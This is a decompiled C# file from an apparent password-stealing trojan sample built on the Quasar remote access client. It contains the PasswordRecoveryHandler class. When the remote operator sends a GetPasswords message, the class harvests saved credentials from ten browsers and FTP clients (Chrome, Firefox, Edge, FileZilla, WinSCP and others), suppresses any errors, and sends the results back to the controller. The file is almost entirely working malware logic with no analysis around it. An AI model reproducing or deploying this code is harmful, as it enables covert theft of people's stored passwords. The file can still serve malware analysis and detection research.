// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.PasswordRecoveryHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Recovery;
using Quasar.Client.Recovery.Browsers;
using Quasar.Client.Recovery.FtpClients;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;

namespace Quasar.Client.Messages
{
  public class PasswordRecoveryHandler : IMessageProcessor
  {
    public bool CanExecute(IMessage message) => message is GetPasswords;

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      if (!(message is GetPasswords message1))
        return;
      this.Execute(sender, message1);
    }

    private void Execute(ISender client, GetPasswords message)
    {
      List<RecoveredAccount> recoveredAccountList = new List<RecoveredAccount>();
      IAccountReader[] accountReaderArray = new IAccountReader[10]
      {
        (IAccountReader) new BravePassReader(),
        (IAccountReader) new ChromePassReader(),
        (IAccountReader) new OperaPassReader(),
        (IAccountReader) new OperaGXPassReader(),
        (IAccountReader) new EdgePassReader(),
        (IAccountReader) new YandexPassReader(),
        (IAccountReader) new FirefoxPassReader(),
        (IAccountReader) new InternetExplorerPassReader(),
        (IAccountReader) new FileZillaPassReader(),
        (IAccountReader) new WinScpPassReader()
      };
      foreach (IAccountReader accountReader in accountReaderArray)
      {
        try
        {
          recoveredAccountList.AddRange(accountReader.ReadAccounts());
        }
        catch (Exception ex)
        {
        }
      }
      client.Send<GetPasswordsResponse>(new GetPasswordsResponse()
      {
        RecoveredAccounts = recoveredAccountList
      });
    }
  }
}
